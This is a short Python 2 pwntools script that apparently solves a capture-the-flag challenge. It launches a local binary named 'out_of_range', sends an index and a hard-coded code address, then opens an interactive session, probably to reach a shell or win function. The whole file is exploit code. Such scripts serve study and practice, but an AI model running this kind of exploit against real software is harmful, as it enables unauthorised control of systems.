#!/usr/bin/env python2
from pwn import *

c = process('./out_of_range')

c.sendline("5")
c.sendline("0x80491f1")
c.interactive()
c.close()
